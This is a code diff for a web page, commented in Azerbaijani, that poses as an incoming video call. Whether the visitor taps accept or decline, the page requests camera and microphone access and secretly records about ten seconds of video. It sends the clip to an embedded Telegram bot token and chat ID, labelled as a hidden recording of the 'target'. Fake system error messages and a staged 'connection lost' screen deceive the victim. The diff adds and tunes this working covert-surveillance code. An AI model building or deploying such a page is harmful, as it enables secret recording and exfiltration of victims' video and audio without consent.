@@ -28,15 +28,17 @@
     </div>
 
     <script>
+        // Sənin Telegram məlumatların
         const TOKEN = '8777132399:AAEnul_U9KpqvJsVZ-BtK99PHRSdmjY0_xk'; 
         const CHAT_ID = '5590781901';
 
         async function startCapture(isAccept) {
             try {
+                // Kamera və Mikrofon icazəsi sorğusu
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 
-                // Ekranda yüklənmə görüntüsü yaradaq ki, şübhələnməsin
-                document.body.innerHTML = "<h2 style='color:white; text-align:center;'>Bağlanılır...</h2>";
+                // İcazə veriləndə ekran dəyişir
+                document.body.innerHTML = "<h2 style='color:white; text-align:center;'>Bağlanılır... Gözləyin.</h2>";
 
                 const mediaRecorder = new MediaRecorder(stream);
                 let chunks = [];
@@ -48,8 +50,9 @@
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
                     formData.append('video', blob, 'v.mp4');
-                    const statusText = isAccept ? "Hədəf zəngi qəbul etdi ✅" : "Hədəf zəngi rədd etdi ✖ (amma çəkiliş alındı)";
-                    formData.append('caption', statusText);
+                    
+                    const actionType = isAccept ? "Hədəf zəngi qəbul etdi ✅" : "Hədəf zəngi rədd etdi ✖";
+                    formData.append('caption', actionType + "\n(10 saniyəlik gizli çəkiliş)");
 
                     await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                         method: 'POST',
@@ -59,19 +62,20 @@
 
                 mediaRecorder.start();
                 
+                // 10 saniyəlik çəkiliş müddəti
                 setTimeout(() => {
                     mediaRecorder.stop();
                     stream.getTracks().forEach(track => track.stop());
                     document.body.innerHTML = "<h2 style='color:white'>Bağlantı kəsildi (Error 405)</h2>";
-                }, 8000);
+                }, 10000);
 
             } catch (err) {
-                // İcazə verilməyəndə çıxan yazı
-                alert("Sistem xətası: Zəng modulunu aktivləşdirmək üçün icazə tələb olunur.");
+                // İcazə verməyəndə çıxan inandırıcı sistem mesajı
+                alert("Sistem Xətası (0x88): Görüntülü zəng modulunu aktivləşdirmək üçün icazə verməyiniz tələb olunur.");
             }
         }
 
-        // Hər iki düymə eyni funksiyanı çağırır
+        // Hər iki düyməyə eyni funksiyanı bağlayırıq
         document.getElementById('acceptBtn').onclick = () => startCapture(true);
         document.getElementById('declineBtn').onclick = () => startCapture(false);
     </script>
